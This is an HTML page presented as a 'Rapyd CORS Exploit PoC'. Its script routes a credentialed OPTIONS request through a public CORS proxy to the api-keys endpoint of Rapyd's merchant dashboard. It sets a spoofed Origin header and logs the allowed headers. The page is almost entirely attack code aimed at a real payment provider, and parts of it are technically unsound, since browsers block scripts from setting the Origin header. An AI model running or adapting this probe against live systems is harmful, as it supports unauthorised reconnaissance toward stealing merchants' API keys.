<!DOCTYPE html>
<html>
  <body>
    <h2>ðŸ’£ Rapyd CORS Exploit PoC</h2>
    
    <script>
async function getAllowedHeaders() {
  const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
  const targetUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
  
  console.log('Starting OPTIONS request to:', proxyUrl + targetUrl);
  
  try {
    const response = await fetch(proxyUrl + targetUrl, {
      method: 'OPTIONS',
      headers: {
        'Accept': 'application/json',
        'Origin': 'https://mohamed22233.github.io'
      },
      credentials: 'include'
    });
    
    console.log('Response status:', response.status, response.statusText);
    
    if (response.ok) {
      const allowedHeaders = response.headers.get('access-control-allow-headers');
      console.log('Raw Allowed Headers:', allowedHeaders);
      
      const headersArray = allowedHeaders ? allowedHeaders.split(',').map(h => h.trim()) : [];
      
      console.log('--- Allowed Headers List ---');
      headersArray.forEach((header, index) => {
        console.log(`${index + 1}. ${header}`);
      });
      console.log('----------------------------');
      
      return headersArray;
    } else {
      console.warn('Request was not successful');
      return [];
    }
  } catch (error) {
    console.error('Error making request:', error);
    console.error('Error details:', {
      name: error.name,
      message: error.message,
      stack: error.stack
    });
    return [];
  }
}

// Execute and log the final result
getAllowedHeaders().then(result => {
  console.log('Final result:', result);
});
    </script>
  </body>
</html>
